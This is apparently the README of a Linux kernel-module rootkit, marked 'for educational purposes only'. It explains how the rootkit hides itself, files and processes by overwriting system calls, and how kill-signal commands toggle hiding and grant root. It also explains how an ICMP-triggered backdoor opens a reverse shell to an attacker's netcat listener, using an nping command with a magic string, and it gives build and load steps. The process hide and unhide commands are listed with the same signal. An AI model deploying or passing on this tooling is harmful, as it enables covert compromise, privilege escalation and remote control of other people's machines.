# Linux Kernel Module rootkit

For educational purposes only.

Tested on ubuntu 22.04.1 LTS.

This simple kernel module rootkit overwrites linux system calls to hide itself, hide files and directories and hide multiple processes. Also when loaded it secretly starts an ICMP listener that starts a reverse shell in response to an attackers ping. It can be controlled via `kill` commands: 

## Commands

- Hide/Show rootkit in the list of loaded modules (`$ lsmod`)
  
  ```
  $ kill -63 1
  ```
  
  When installed it starts hidden. You can only remove it when it's unhidden.

- Become root
  
  ```
  $ kill -64 1
  ```

- Hide process with pid

  ```
  $ kill -62 <pid>
  ```

- Unhide process with pid

  ```
  $ kill -62 <pid>
  ```

It also hides every file and directory with prefix `rootk_`.

## Backdoor

On attacker machine start netcat listener on some port:

```
$ nc -lnvp <port>
```

Send ICMP ping to victim:

```
$ nping --icmp -c 1 -dest-ip <victim-ip> --data-string 'xCs!w@ <attacker-ip> <port>'
```

## Install

Compile module and backdoor:

```
$ make
$ make install
```

Load module:

```
$ sudo insmod rk.ko
```

### Remove module:

Make sure the module is visible in `lsmod`. To toggle visibility run `kill -63 1`.

Then you can remove it using:

```
$ sudo rmmod rk.ko
```
